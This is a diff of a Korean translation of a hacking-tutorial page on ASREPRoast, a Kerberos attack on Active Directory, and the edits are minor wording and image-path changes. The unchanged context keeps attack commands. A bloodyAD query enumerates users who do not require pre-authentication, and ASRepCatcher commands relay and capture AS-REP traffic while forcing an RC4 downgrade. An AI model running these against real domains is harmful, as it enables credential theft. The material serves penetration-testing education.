@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
@@ -32,7 +32,7 @@ Stay informed with the newest bug bounties launching and crucial platform update
 
 ## ASREPRoast
 
-ASREPRoast는 **Kerberos 사전 인증 필수 속성**이 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이 도메인 컨트롤러(DC)에서 사용자 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인에서 크랙하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.
+ASREPRoast는 **Kerberos 사전 인증 필수 속성**이 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이 도메인 컨트롤러(DC)에서 사용자의 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인에서 크랙하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.
 
 이 공격의 주요 요구 사항은 다음과 같습니다:
 
@@ -48,7 +48,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
 {% endcode %}
 
-{% code title="리눅스 사용하기" %}
+{% code title="리눅스 사용" %}
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
@@ -98,7 +98,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ## 자격 증명 없이 ASREProast
 
 공격자는 중간자 위치를 사용하여 AS-REP 패킷을 캡처할 수 있으며, 이는 Kerberos 사전 인증이 비활성화되지 않은 상태에서도 네트워크를 통과합니다. 따라서 VLAN의 모든 사용자에게 작동합니다.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 를 사용하면 가능합니다. 또한, 이 도구는 Kerberos 협상을 변경하여 클라이언트 워크스테이션이 RC4를 사용하도록 강제합니다.
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 를 사용하면 이를 수행할 수 있습니다. 또한, 이 도구는 Kerberos 협상을 변경하여 클라이언트 워크스테이션이 RC4를 사용하도록 강제합니다.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -115,7 +115,7 @@ ASRepCatcher listen
 
 ***
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 경험이 풍부한 해커 및 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!
 
